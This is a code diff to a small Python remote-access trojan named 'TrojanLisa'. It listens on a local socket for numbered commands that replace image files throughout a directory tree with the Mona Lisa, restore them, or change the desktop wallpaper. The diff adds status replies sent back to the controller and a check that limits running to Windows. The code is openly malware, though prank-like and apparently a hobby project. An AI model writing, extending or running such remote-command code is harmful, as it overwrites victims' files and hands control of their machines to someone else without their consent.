@@ -4,6 +4,7 @@ import socket
 import ctypes
 import base64
 import zlib
+import sys
 
 class TrojanLisa:
     def __init__(self):
@@ -24,8 +25,11 @@ class TrojanLisa:
                         break
                     resp = data.decode()
                     print(resp)
-                    self.execute(resp)
-                    message = "Message from server"
+                    execution_status = self.execute(resp)
+                    if execution_status == True:
+                        message = "Response: Success"
+                    else:
+                        message = "Response: Failure"
                     conn.send(message.encode())
                 except:
                     break
@@ -37,17 +41,19 @@ class TrojanLisa:
         if command == "1":
             print("Replacing images with Mona Lisa...")
             self.replace_images(os.curdir)
-        if command == "2":
+        elif command == "2":
             print("Restoring original images...")
             self.restore_images(os.curdir)
-        if command == "3":
+        elif command == "3":
             print("Changing background...")
             self.change_wallpaper()
-        if command == "4":
+        elif command == "4":
             print("Killing the RAT...")
             self.active = False
         else:
             print("Invalid command.")
+            return False
+        return True
 
     """ Replace images within a specified directory and all its children """
     def replace_images(self, root_dir):
@@ -65,6 +71,9 @@ class TrojanLisa:
             
 if __name__=="__main__":
     trojan_lisa = TrojanLisa()
-    trojan_lisa.host('127.0.0.1', 8080)
-    trojan_lisa.replace_images(".")
-    trojan_lisa.restore_images(".")
+    if sys.platform == "win32":
+        trojan_lisa.host('127.0.0.1', 8080)
+        trojan_lisa.replace_images(".")
+        trojan_lisa.restore_images(".")
+    else:
+        print("RAT can only be run on Windows.")
